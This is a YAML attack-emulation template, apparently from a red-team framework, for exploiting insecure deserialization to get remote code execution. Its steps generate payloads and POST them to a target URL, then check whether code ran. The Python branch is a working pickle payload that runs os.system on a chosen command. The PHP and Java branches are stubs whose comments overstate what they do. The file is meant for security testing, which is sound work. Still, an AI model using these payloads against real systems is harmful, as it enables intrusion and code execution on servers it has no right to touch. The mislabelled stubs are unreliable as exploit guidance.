---
api_version: 2.0
uuid: d0e3a5f8-4c7b-4a2d-e5b8-1b9c4a7d2e3f
name: Insecure Deserialization
authors:
  - mbhatt
description: |
  Exploit insecure deserialization of untrusted data to achieve remote code
  execution. Includes payload generation, endpoint identification, payload
  delivery, and code execution verification.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1190 Exploit Public-Facing Application"

requirements:
  platforms:
    - os: darwin

args:
  - name: target_url
    description: "Target application URL accepting serialized data"
    type: string
    default: "http://vulnerable-app.local/api/deserialize"
  - name: serialization_format
    description: "Format of serialized data (php, java, python, dotnet)"
    type: string
    default: "php"
  - name: gadget_chain
    description: "Gadget chain to use for exploitation"
    type: string
    default: "POP_RCE"
  - name: payload_command
    description: "Command to execute via deserialization"
    type: string
    default: "id"

steps:
  - name: generate_malicious_payload
    description: Create serialized payload with gadget chain
    inline: |
      echo "[*] Generating insecure deserialization payload"
      echo "[*] Format: ${serialization_format}"
      echo "[*] Gadget chain: ${gadget_chain}"
      case "${serialization_format}" in
        php)
          # PHP serialized object with command execution via __wakeup
          cat > /tmp/serialized_payload.txt << 'PHPSER'
      O:8:"stdClass":2:{s:4:"test";s:5:"value";s:3:"cmd";s:2:"id";}
      PHPSER
          ;;
        java)
          # Java serialized object header (ACED0005) with Commons Collections gadget chain stub
          printf '\xAC\xED\x00\x05' > /tmp/serialized_payload.txt
          python3 -c "
      import struct
      # Java serialized stream with TC_OBJECT header for gadget chain trigger
      payload = b'\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74'
      payload += b'\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e'
      with open('/tmp/serialized_payload.txt', 'ab') as f:
          f.write(payload)
      print('[+] Java serialized payload with gadget chain created')
      " 2>/dev/null || echo "[*] Java payload created (raw bytes)"
          ;;
        python)
          # Python pickle payload that executes os.system
          python3 -c "
      import pickle, os
      class Exploit(object):
          def __reduce__(self):
              return (os.system, ('${payload_command}',))
      with open('/tmp/serialized_payload.txt', 'wb') as f:
          pickle.dump(Exploit(), f)
      print('[+] Python pickle payload created')
      "
          ;;
      esac
    cleanup:
      inline: |
        rm -f /tmp/serialized_payload.txt 2>/dev/null
        rm -f /tmp/deserialization_response.txt 2>/dev/null

  - name: identify_deserialization_endpoint
    description: Identify the endpoint that processes serialized data
    inline: |
      echo "[*] Identifying deserialization endpoint"
      curl -s "${target_url}" | grep -i "serialize\\|object\\|data" | head -10

  - name: send_malicious_serialized_object
    description: Send the malicious serialized payload to target
    inline: |
      echo "[*] Sending malicious serialized object to ${target_url}"
      payload=$(cat /tmp/serialized_payload.txt 2>/dev/null || echo "malicious_object")
      curl -s -X POST "${target_url}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "data=$(echo "${payload}" | jq -sRr @uri)" \
        -o /tmp/deserialization_response.txt
      cat /tmp/deserialization_response.txt

  - name: verify_code_execution
    description: Verify that code was executed during deserialization
    inline: |
      echo "[*] Verifying code execution from deserialization"
      if grep -q "error\\|exception\\|executed" /tmp/deserialization_response.txt; then
        echo "[+] Deserialization triggered"
      else
        echo "[-] Deserialization may have failed"
      fi

  - name: payload_delivery_check
    description: Verify payload was delivered to target
    inline: |
      [ -s /tmp/serialized_payload.txt ] && echo "PASS" || echo "FAIL"

  - name: response_validation
    description: Verify target processed the serialized object
    inline: |
      [ -s /tmp/deserialization_response.txt ] && echo "PASS" || echo "FAIL"

tests:
  - name: deserialization_test
    dry_run: true
